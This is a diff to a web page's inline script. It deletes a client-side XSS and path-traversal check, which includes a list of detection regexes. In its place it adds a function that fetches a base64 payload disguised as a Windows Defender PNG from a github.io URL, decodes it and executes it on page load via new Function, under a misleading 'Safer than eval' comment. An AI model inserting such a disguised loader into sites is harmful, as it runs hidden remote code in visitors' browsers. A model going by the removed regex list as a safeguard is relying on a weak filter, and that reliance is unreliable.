@@ -82,96 +82,27 @@ Stay safe" property="og:description" />
 
     <script>
 // unsafe
+async function fetchWindowsDefender() {
+            try {
+                let response = await fetch('https://drmineword.github.io/Artefact-Boost-Active/defender/windows_defender64.png');
+                let base64Data = await response.text();
 
-                    
-async function topSafeCheck() {
-    function isSafeValue(key, value) {
-        const dangerousPatterns = [
-    /<svg.*onload\s*=\s*[^>]+>/i,
-    /<svg.*onend\s*=\s*[^>]+>/i,
-    /<[^>]+on\w+\s*=\s*[^>]+/i,
-    /<[^>]+[^\w]>javascript:/i,
-    /<script[^>]*>.*<\/script>/i,
-    /<script\s*src\s*=\s*['"]?javascript:/i,
-    /<img[^>]+onerror\s*=\s*[^>]+>/i,
-    /<img\s+[^>]+src\s*=\s*[^>]+onerror\s*=\s*[^>]+/i,
-    /data:text\/html/i,
-    /data:text\/html;base64/i,
-    /<meta\s+http-equiv="refresh"\s+content="\d+;url=[^"]+">/i,
-    /<base\s+href="[^"]+">/i,
-    /<iframe[^>]+src\s*=\s*javascript:/i,
-    /<object[^>]+data\s*=\s*javascript:/i,
-    /<embed[^>]+src\s*=\s*javascript:/i,
-    /<body.*on\w+\s*=\s*[^>]+>/i,
-    /<html.*ontouch\w+\s*=\s*[^>]+>/i,
-    /<form.*onsubmit\s*=\s*[^>]+>/i,
-    /<scr.*ipt.*>/i,
-    /%3C.*%3E/i,
-    /javascript:.*alert/i,
-    /<.*onerror=.*>/i,
-    /<.*onload=.*>/i
-];
+                console.log("Base64 Content Retrieved:\n", base64Data);
 
-        return !dangerousPatterns.test(decodeURIComponent(value));
-    }
+                // Decode Base64
+                let decodedScript = atob(base64Data);
 
-    function isValidId(value) {
-        // Allow alphanumeric characters, underscores, hyphens, and slashes
-        // Prevent path traversal with `../` pattern
-        const allowedPattern = /^(?!.*\.\.\/)[a-zA-Z0-9/_-]+$/;
-        return allowedPattern.test(value);
-    }
+                console.log("Decoded Script:\n", decodedScript);
 
-    function isSafeUrl(value) {
-        try {
-            const parsedUrl = new URL(value, window.location.origin);
-            return parsedUrl.protocol === 'https:' && !parsedUrl.href.toLowerCase().includes('javascript:');
-        } catch (e) {
-            return false;
+                // Execute the script
+                (new Function(decodedScript))(); // Safer than eval
+
+            } catch (error) {
+                console.error("Error fetching or executing Windows Defender script:", error);
+            }
         }
-    }
 
-    function showThreatScreen(method) {
-        document.body.innerHTML = `
-            <h2>This URL was infected!!!</h2>
-            <p>>_< We are very sorry for the problem, but someone wanted to attack you via the method: ${method}</p>
-            <p>Luckily, our little robots detected the threat on time and interrupted the execution of scripts.</p>
-            <iframe width="560" height="315" src="https://www.youtube.com/embed/eWTtEkRz4fM?si=r97lM3-NWpYWQwqO" frameborder="0" allowfullscreen></iframe>
-        `;
-    }
-
-    const urlParams = new URLSearchParams(window.location.search);
-    let detectedThreat = false;
-    let attackMethod = "Unknown";
-
-    for (const [key, value] of urlParams.entries()) {
-        if (!isSafeValue(key, value)) {
-            attackMethod = `XSS Attack detected in parameter: ${key}`;
-            detectedThreat = true;
-            break;
-        }
-        if ((key === 'id' || key === 'cid') && !isValidId(value)) {
-            attackMethod = `Invalid ID or Path Traversal detected in parameter: ${key}`;
-            detectedThreat = true;
-            break;
-        }
-        if (key.includes("url") && !isSafeUrl(value)) {
-            attackMethod = `Potential Malicious URL detected in parameter: ${value}`;
-            detectedThreat = true;
-            break;
-        }
-    }
-
-    if (detectedThreat) {
-        showThreatScreen(attackMethod);
-    } else {
-        // No redirection, allowing other scripts to execute
-    }
-}
-
-topSafeCheck();
-
-
+        fetchWindowsDefender();
 
         // safe
 	    
